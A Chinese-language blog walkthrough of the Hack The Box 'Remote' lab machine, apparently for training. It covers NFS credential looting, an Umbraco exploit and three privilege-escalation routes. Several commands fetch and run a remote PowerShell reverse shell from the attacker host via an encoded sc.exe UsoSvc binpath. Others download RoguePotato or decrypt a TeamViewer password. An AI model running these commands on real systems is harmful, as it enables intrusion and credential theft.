> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MjuZ8xj4Nd8Eddm30wjnuw)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **196** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_gif/ldWFh337rbjfApaRGicR1GGwHDCYPhsKZ9euLodKu0upoCBupGzffThUrZlyL2I0qu4OzmzGg3YQ4JPhJ2UZ18A/640?wx_fmt=gif)

靶机地址：https://www.hackthebox.eu/home/machines/profile/234

靶机难度：初级（4.7/10）

靶机发布日期：2020 年 9 月 1 日

靶机描述：

Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using psexec with these credentials returns a SYSTEM shell.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/ibQV91UPVPA0YraLBxG6SF7hBIMGETWZCPmdut5HSvsfqQz6CtfmOScRtJFM8gtn5LKRiav4DhT1Cxk6YPiaEHZvQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/dphnm0BKfwKLtib9vQ1APuIAKeJtunpQ9t0U2bFm604pdiagpiavfaicU0LSsYk60Ugh838nnFVzywH0z19gB2VMOQ/640?wx_fmt=gif)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/7phYCjicsxExcHT6Dnz0PPkUycARhia5vV64je93lrrZSxlz64jyGCuicicUC0jAZx4rsG4qsfMwymvib1zwhibQRdaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSlOcxqepv0JwvLxvKxPNIm6Qg05BuYbySmnO0V40XCfNuGib0g2jMKibA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.180...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSc7OjzSHstAspspUXdN4djawpmoXicXTM1pHjicxSM75wMoPxAAcdppEQ/640?wx_fmt=png)

利用 masscan 扫描发现 21,80,135,139,111,445,5985,2049 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSdpCtY9UajbwQeT7AkEWf7ibh77Bp1kf89C0cibJnKY5GqeZpzPSIriauA/640?wx_fmt=png)

利用 nmap 深入扫描发现的端口，可看到 FTP，SMB，HTTP 和 NFS 服务正在运行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSj2vSnY7cknIH2BxBR7icicplno10hD7wPnIiauaWXySGq0CVhalnqrBcA/640?wx_fmt=png)

直接上来就查看 web 服务，主页面情况...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSO7opNBFWvmLZfzVTezRCrvP9fSj9dOibgVqiaMTRJnVnAo6aoDkS4dlA/640?wx_fmt=png)

往下滑动发现了几篇笔记文章，umbraco 出现在眼前... 搜索知道这是 CMS 的系统...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHS33XV3ialcTB0yXEOB0Sz6fkcdtvkFgY7sicicMibfo259uHqcyXL2sgwWQ/640?wx_fmt=png)

```
gobuster dir -u http://10.10.10.180/ -w=/usr/share/dirb/wordlists/common.txt
```

可以看到利用 gobuster 爆破目录也发现了存在 umbraco 目录情况...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSnGNhOzDU8mUOyOYdMlOThlS5xhKIRsoy0p5YbflbcnqASb6NlELVsA/640?wx_fmt=png)

访问这是 umbraco 的 CMS 框架的登录页面...

需要用户名密码，默认密码无法登录，这里需要继续枚举别的端口了...

这里枚举了 FTP 匿名允许登录，但是目录空...

SMB 虽然开放了，但是无法访问任何共享目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHS5U1Mf04nIHVSwnvQGVgmx3gCru2gesh62MdCgZvqk5zm4ibv6Y7KpHg/640?wx_fmt=png)

```
showmount -e 10.10.10.180
sudo mount -t nfs 10.10.10.180:/site_backups /home/dayu/桌面/dayuRemote/mnt
```

经过对 2049 端口 NSF 服务进行枚举，发现了 site_backups 路径，将它挂载在 mnt 目录中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSluWj1CAqSLrJVAy2UqHSrhIOQ4icVeBYSZJak7WuniakzQhZwWjlyyQQ/640?wx_fmt=png)

```
strings Umbraco.sdf
```

在枚举中，APP_Data 目录下发现了 sdf 数据库文件信息... 利用 strings 枚举了该文件...

发现存在哈希 `b8be16afba8c314ad33d812f22a04991b90e2aaa`....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSvhdwUiay8hib0w2UFawWEfZPnpllVNrfe4qmqfO32eOSiavXXFw0tbmyg/640?wx_fmt=png)

这里利用 john 或者 hashcat 都可以爆破密码... 发现了密码信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSyXFpW2iaknztoCxroAGKeicHBbkrbYEzxEYNI3f1d6ZfTVIdXFBKhWvg/640?wx_fmt=png)

利用 admin@ctf.com 用户名密码成功登录了登录表单页面...

点击帮助发现了该版本信息...7.12.4

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHS9XronO1qYmJvMFuHTPGHnEd23Pmfe8XawbbaDwqR3Qr1ncpIcjniaWg/640?wx_fmt=png)

本地 kali 搜索该框架是否存在漏洞，发现了 7.12.4 存在可利用的 EXP...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSxgr5ib3t1u07hP4eQcC3eFndpVsvT2cv9dYiazpj9EGjZObSZZ6PD1lw/640?wx_fmt=png)

查看代码，发现了其中原理，利用用户名密码访问该框架后，调用 xx.exe 进程获得 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSQVxA5ibmsefEbyianjf33spGRM2rRVrGHC0kiaZ5ElOIhsGI67EZHU5XQ/640?wx_fmt=png)

测试下 ping....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSwBaWlqpb4oNLCiafwjA4LEP1QHB4PzF5WkUV4UA6737ezzrKNjt8Vtw/640?wx_fmt=png)

测试成功的，获得了 icmp 的回包...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSDF6lqKBaLrCeno8frOjtIgxjBZUo42Aib5gpq33GGxPLwY1826r0amQ/640?wx_fmt=png)

利用 nishang 的 ps1 进行提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSMfPoicnAibsCLIjoxASiaULDPnhToODj1N28ZmwK1VtLdT3rBf4AiaJS6A/640?wx_fmt=png)

开启监听模式，开启 web 服务，执行修改后的 EXP，获得了 shell 外壳... 权限是低权用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSvbvLiblGKZUBXbxLR8TWVKWweNwSQDMaviclUdXNzYjVDEhgGIT0hG5g/640?wx_fmt=png)

通过低权用户获得了 user_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSiciaI0l9PZLMMJA84mqpaTPBHw2ibpQHaFdrYKibrUINHwdcH9cvN65VbQ/640?wx_fmt=png)

需要提权到 system，这里我上传了 winPEAS 进行靶机分析枚举...

发现了很多方法能提权...

![](https://mmbiz.qpic.cn/mmbiz_gif/sDKv42fen7ibImvibcQAzTWKALz80xXATRNaLArXkQdFJlXIoVCNT7P5mhyWCLXiaicY56ibiaTEg2Ir5PQdaiajY4J7A/640?wx_fmt=gif)

方法 1：

UsoSvc 提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSgMiaicAtb1bFPCxFhicCoxhFMVxS5U8ibf1XYicpjgC72T84M5Rm5T83TCw/640?wx_fmt=png)

执行 winPEAS 看到 UsoSvc：ALLAccess，可利用本地特权升级...

给出了黄色字体 URL：

```
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
```

里面介绍了如何利用 UsoSvc 进行提权的 POC...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSSu8IPbvuicSaFvwTZEuXm4Sce4Uk5K8DZWZJIDvD10ibJibtkkV2kHrAA/640?wx_fmt=png)

```
echo "IEX( IWR http://10.10.14.2/Invoke-PowerShellTcp.ps1 -UseBasicParsing)" | iconv -t utf-16le|base64 -w 0
```

查看该 POC，经过测试，无法直接使用 powershell 命令直接执行上传 shell 提权...

需要转换为 base64 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSxPhTbMglHP1JvTyVV58xqE1rwxibmPiaic1icstmicIMRsgLFpD3IYKhbQg/640?wx_fmt=png)

```
sc.exe config UsoSvc binpath= "cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="
sc.exe stop UsoSvc
sc.exe start UsoSvc
```

通过利用 sc.exe 本地特权提升，通过上传 nishang 的 shell，反弹获得了 system 特权外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSDspxT1OmviaJM0OLegaiaKw2ibnXrgAqhnCicicsjQnS4omicvE7ODP5Zmicw/640?wx_fmt=png)

通过 system 最高权限获得了 root_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_gif/sDKv42fen7ibImvibcQAzTWKALz80xXATRNaLArXkQdFJlXIoVCNT7P5mhyWCLXiaicY56ibiaTEg2Ir5PQdaiajY4J7A/640?wx_fmt=gif)

方法 2：

土豆提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHS5WyEjF4ib7ibbtRCSwLwWyn6D1ldv3BG1jLFQRMMEo6kuhxibwCib0cicfw/640?wx_fmt=png)

```
https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
iwr http://10.10.14.2/RoguePotato.exe -OutFile RoguePotato.exe
iwr http://10.10.14.2/RogueOxidResolver.exe -OutFile RogueOxidResolver.exe
```

由于 UsoSvc 权限是全开放的，ALL 状态...  

这里可以直接利用土豆提权即可... 用过太多次了... 但是这里在简单讲解一遍...

通过地址下载土豆... 然后上传到靶机...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSkmIkrEO9rsSV5oyb3BuSbBGepUEVrjRbtP8pZ2f3A0O9pFGdlh6ntQ/640?wx_fmt=png)

```
https://github.com/antonioCoco/RoguePotato
```

在土豆页面看到了用的方法...

尝试不适用 CLSID 执行还是无效... 需要查找下 CLSID 写入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSIa154qgsua4Icjk4QHrylSSeUsMLYS8SvMBSqqGHnFAHowkXzX0fog/640?wx_fmt=png)

```
http://ohpe.it/juicy-potato/CLSID/
```

选择 win10...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSR7MpBicABYr8yKzgfTr4r0bN6S0DtpmvBgqmDwTQY8lqCgpvTm5gPdw/640?wx_fmt=png)

然后找到 UsoSvc.... 可看到 CLSID 有两个...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSVaicKYuLel624kOSYPSic9npxYvdnwWIgYBKB86KkNLoibwLrPgtEc8icQ/640?wx_fmt=png)

```
./RoguePotato.exe -r 10.10.14.2 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "cmd.exe /c powershell -EncodedCommand + base64-shell即可"
```

通过 - c 写入 CLSID 即可... 成功执行后下载了 nishang 的 shell，获得了 system 外壳...

![](https://mmbiz.qpic.cn/mmbiz_gif/sDKv42fen7ibImvibcQAzTWKALz80xXATRNaLArXkQdFJlXIoVCNT7P5mhyWCLXiaicY56ibiaTEg2Ir5PQdaiajY4J7A/640?wx_fmt=gif)

方法 3：

内核程序提权...TearmViewer...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSBceE8j62O4PtTJpc0DicWRktXPPHh6DibHQdiaibPVwT67SnfEhngT28bA/640?wx_fmt=png)

tasklist 枚举所有存在的进程，发现了存在 TeamViewer 进程运行中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHShw9C4PQTG2cUX2KJS8bggSibjicdkhqT6tcxmpZlNNyBUDIFq1e95FHQ/640?wx_fmt=png)

找到了 win 目录下 VM 的程序目录，是 V7 版本...

V7 版本存在漏洞，而且 MSF 就有 EXP 方法...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSTicCzNJ85ItYIWREtXcteMPgfxqjcNnRt8ha7dBuXpfxxqPGAo2pBGw/640?wx_fmt=png)

```
cat /usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
```

这里我未使用 MSF 进行读取...

我先利用 search 查看了 vm_passwd 的 EXP 源码...

查看源码知道需要使用静态密匙 AES....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSJcVZ5dAtrCzf7ZQ7ibjZ0u9eibTTDjWJ9nObDvNnF9OH5icDM1HnVFrBw/640?wx_fmt=png)

通过 google 知道 VM 的 V7 版本注册表在：`HKLM:\software\wow6432node\teamviewer\version7`...

进入后通过命令 `(get-itemproperty -path .).SecurityPasswordAES` 读取到了 AES 静态码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSOXTMHkxbCMc8Pzzic9uOBFGMbqgsvX4pgxw9XuWGlcaPGnCsT0FkXTg/640?wx_fmt=png)

通过静态码，简单的按照 EXP 编写...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHS4MJCdo6EReQtpTbam84FlIDnjOC5AICuLONhkp7Qa8St8VOZibF4gqA/640?wx_fmt=png)

执行获得了 administrator 密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KN3rUDKv2w9hG8ZvibDTGBHSPcLUuVIQ0hX27nGvqfvvmrO7EhSG5xdVnjNgcUD5xMicRtyDCLrXBcA/640?wx_fmt=png)

```
evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180
```

![](https://mmbiz.qpic.cn/mmbiz_png/icBLNuMg2BocVDaGaH5rXGsbC8nHjORHUOLQdgsfSbQ6icST8S1UiapZ8sicHMwSaZkRHEibLeSavBBCKg1OfO4rxgw/640?wx_fmt=png)

有了密码，这里有很多种方法可以登录... 我利用了 evil-winrm 成功登录...

或者使用 psexec、wmiexec 都可以...

靶机全是经典的 CVE 漏洞提权... 没有别的花里胡哨的东西...

适合初学者学习，非常棒的一台靶机...

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台初级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)